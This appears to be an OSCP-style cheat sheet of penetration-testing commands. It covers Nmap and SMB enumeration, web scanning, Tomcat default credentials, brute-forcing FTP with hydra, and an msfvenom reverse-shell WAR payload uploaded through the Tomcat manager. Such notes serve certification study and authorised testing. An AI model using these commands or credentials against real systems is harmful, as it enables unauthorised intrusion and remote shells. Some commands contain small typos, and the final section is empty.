# OSCP-Cheat-Sheet

## NMAP

### TCP 

<code>nmap -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.tcp] -p- [IP]</code>

### UDP

<code>nmap -sU -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.udp] [IP]</code>

## SMB/Samba

<code>nmap -p 139,445 -Pn -script=smb-vuln* [IP]</code>

<code>smbclient -L //[IP]/</code>

<code>enum4linux -a [IP]</code>

<code>smbmap -H [IP]</code>

<code>./smbver.sh [IP]</code> [Found Here](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)

## Werb Server

<code>dirb [URL]</code>

<code>nikto -h [URL]</code>

### Tomcat

#### Default Credentials

<code>admin:admin</code>

<code>tomcat:tomcat</code>

<code>admin:[NOTHING]</code>

<code>admin:s3cr3t</code>

<code>tomcat:s3cr3t</code>

<code>admin:tomcat</code>

#### Payload

<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war</code>

##### Uploading to Tomcat6

<code>wget 'http://[USER]:[password]@[IP]:8080/manager/deploy?war=file:shell.war&path=/shell' -O -</code>

##### Uploading to Tomcat7 and Above

<code>curl -v -u [USER]:[PASSWORD]] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>





## FTP 

### Brute Force

<code>hydra -V -f -L [USER_LIST] -P [PASSWORDS_LIST] ftp://[IP] -u -vV</code>

### Download

<code>ftp [IP]</code>

<code>>PASSIVE</code>

<code>>BINARY</code>

<code>>get [FILE]</code>

### Upload

<code>ftp [IP]</code>

<code>>PASSIVE</code>

<code>>BINARY</code>

<code>>put [FILE]</code>


## Exploitation




